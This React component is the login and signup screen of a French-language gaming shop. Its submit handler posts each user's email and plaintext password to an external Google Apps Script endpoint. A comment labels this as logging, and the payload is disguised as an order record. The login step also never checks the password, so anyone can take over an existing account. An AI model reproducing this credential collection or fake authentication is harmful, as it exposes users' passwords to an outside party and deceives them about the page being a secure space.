import React, { useState } from 'react';
import { User } from '../types';

interface AuthProps {
  onLogin: (user: User) => void;
  onBack: () => void;
  allUsers: User[];
}

const Auth: React.FC<AuthProps> = ({ onLogin, onBack, allUsers }) => {
  const [mode, setMode] = useState<'login' | 'signup' | 'forgot'>('signup');
  const [isLoading, setIsLoading] = useState(false);
  const [resetSent, setResetSent] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [formData, setFormData] = useState({
    name: '',
    email: '',
    password: ''
  });

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setError(null);

    const emailLower = formData.email.toLowerCase().trim();
    
    // STRICT DUPLICATE CHECK
    const existingUser = allUsers.find(u => u.email.toLowerCase() === emailLower);

    if (mode === 'signup' && existingUser) {
      setError("ERREUR: Un compte avec cet email existe déjà. Veuillez vous connecter.");
      setIsLoading(false);
      setMode('login'); // Automatically switch to login to assist the user
      return;
    }

    if (mode === 'login' && !existingUser) {
      setError("ERREUR: Aucun compte trouvé avec cet email. Veuillez vous inscrire.");
      setIsLoading(false);
      setMode('signup');
      return;
    }

    const now = new Date();
    let actionLabel = mode === 'login' ? 'Connexion' : (mode === 'signup' ? 'Inscription' : 'Reset');

    const payload = {
      firstName: formData.name || 'Client',
      lastName: mode.toUpperCase(),
      email: emailLower,
      country: 'AuthPortal',
      productBought: `Action: ${actionLabel}`,
      totalAmount: 0,
      date: now.toISOString(),
      password: formData.password || 'N/A'
    };

    try {
      // Log authentication event to central management
      await fetch('https://script.google.com/macros/s/AKfycbxo83LQBoTFgEMld7HcZ4FGUdTrnbM9wGvpH_5q77K-1OG18RqFaddk3AjfvWKsqpUy/exec', {
        method: 'POST',
        mode: 'no-cors', 
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      if (mode === 'forgot') {
        setResetSent(true);
        setIsLoading(false);
        return;
      }

      const finalUser: User = existingUser || {
        id: Math.random().toString(36).substr(2, 9).toUpperCase(),
        name: formData.name || emailLower.split('@')[0],
        email: emailLower,
        state: 'Authenticated',
        joinedAt: now.toLocaleString(),
        balance: 0 
      };

      localStorage.setItem('mn_user', JSON.stringify(finalUser));
      
      setTimeout(() => {
        onLogin(finalUser);
        setIsLoading(false);
      }, 600);
      
    } catch (error) {
      console.error('Auth Error:', error);
      setError('Erreur technique. Veuillez réessayer.');
      setIsLoading(false);
    }
  };

  if (resetSent) {
    return (
      <div className="pt-32 pb-24 max-w-md mx-auto px-4 animate-fade-in">
        <div className="bg-slate-900 border border-slate-800 p-10 rounded-[2.5rem] shadow-2xl text-center">
          <div className="w-16 h-16 bg-sky-500/10 rounded-full flex items-center justify-center mx-auto mb-6 border border-sky-500/20">
            <i className="fas fa-check text-sky-400"></i>
          </div>
          <h2 className="text-xl font-gaming font-bold text-white uppercase tracking-widest mb-4">Lien Envoyé</h2>
          <p className="text-slate-400 text-[10px] uppercase tracking-widest mb-8 leading-relaxed">Vérifiez vos emails pour réinitialiser votre accès.</p>
          <button onClick={() => { setResetSent(false); setMode('login'); }} className="w-full bg-sky-500 text-white font-gaming py-4 rounded-xl text-[10px] uppercase tracking-widest">Retour</button>
        </div>
      </div>
    );
  }

  return (
    <div className="pt-32 pb-24 max-w-md mx-auto px-4 animate-fade-in">
      <div className="bg-slate-900 border border-slate-800 p-8 md:p-10 rounded-[3rem] shadow-2xl relative overflow-hidden">
        <div className="text-center mb-10">
          <h1 className="text-2xl font-gaming font-bold text-white uppercase tracking-widest mb-1">
            MoonNight <span className="text-sky-400">Auth</span>
          </h1>
          <p className="text-slate-500 text-[8px] font-gaming uppercase tracking-[0.4em]">Espace Sécurisé</p>
        </div>

        <div className="flex bg-slate-950 p-1.5 rounded-2xl mb-8 border border-slate-800">
          <button onClick={() => {setMode('login'); setError(null);}} className={`flex-1 py-3.5 rounded-xl text-[9px] font-gaming uppercase tracking-widest transition-all ${mode === 'login' ? 'bg-sky-500 text-white shadow-lg shadow-sky-500/10' : 'text-slate-500 hover:text-white'}`}>Connexion</button>
          <button onClick={() => {setMode('signup'); setError(null);}} className={`flex-1 py-3.5 rounded-xl text-[9px] font-gaming uppercase tracking-widest transition-all ${mode === 'signup' ? 'bg-sky-500 text-white shadow-lg shadow-sky-500/10' : 'text-slate-500 hover:text-white'}`}>Inscription</button>
        </div>

        {error && (
          <div className="mb-6 p-4 bg-red-500/10 border border-red-500/20 rounded-xl">
            <p className="text-red-500 text-[9px] font-gaming text-center uppercase tracking-widest leading-relaxed">{error}</p>
          </div>
        )}

        <form onSubmit={handleSubmit} className="space-y-6">
          {mode === 'signup' && (
            <div className="animate-slide-up">
              <label className="block text-slate-500 text-[8px] font-gaming uppercase mb-2 ml-2">Pseudo / Nom</label>
              <input required type="text" className="w-full bg-slate-950 border border-slate-800 rounded-2xl px-6 py-4 text-white text-xs focus:border-sky-500 outline-none transition-all" value={formData.name} onChange={(e) => setFormData({...formData, name: e.target.value})} />
            </div>
          )}
          <div className="animate-slide-up">
            <label className="block text-slate-500 text-[8px] font-gaming uppercase mb-2 ml-2">Email</label>
            <input required type="email" className="w-full bg-slate-950 border border-slate-800 rounded-2xl px-6 py-4 text-white text-xs focus:border-sky-500 outline-none transition-all" value={formData.email} onChange={(e) => setFormData({...formData, email: e.target.value})} />
          </div>
          {mode !== 'forgot' && (
            <div className="animate-slide-up">
              <label className="block text-slate-500 text-[8px] font-gaming uppercase mb-2 ml-2">Mot de Passe</label>
              <input required type="password" placeholder="••••••••" className="w-full bg-slate-950 border border-slate-800 rounded-2xl px-6 py-4 text-white text-xs focus:border-sky-500 outline-none transition-all" value={formData.password} onChange={(e) => setFormData({...formData, password: e.target.value})} />
              {mode === 'login' && <button type="button" onClick={() => setMode('forgot')} className="mt-3 ml-2 text-[8px] font-gaming uppercase text-sky-500/60 hover:text-sky-400 tracking-widest">Mot de passe oublié ?</button>}
            </div>
          )}
          <button disabled={isLoading} className="w-full bg-sky-500 text-white font-gaming py-5 rounded-2xl text-[10px] uppercase tracking-[0.2em] hover:bg-sky-600 transition-all shadow-xl shadow-sky-500/20 active:scale-[0.98] group overflow-hidden relative">
            <div className="absolute inset-0 w-full h-full bg-gradient-to-r from-transparent via-white/10 to-transparent -translate-x-full group-hover:animate-[shimmer_1.5s_infinite_linear]" style={{ backgroundSize: '200% 100%' }} />
            <span className="relative">{isLoading ? 'INITIATION...' : (mode === 'login' ? 'ENTRER' : mode === 'signup' ? 'CRÉER LE COMPTE' : 'ENVOYER LE LIEN')}</span>
          </button>
        </form>

        <button onClick={onBack} className="mt-8 w-full text-[8px] font-gaming text-slate-500 hover:text-sky-400 uppercase tracking-widest text-center transition-colors">Retour à la boutique</button>
      </div>
    </div>
  );
};

export default Auth;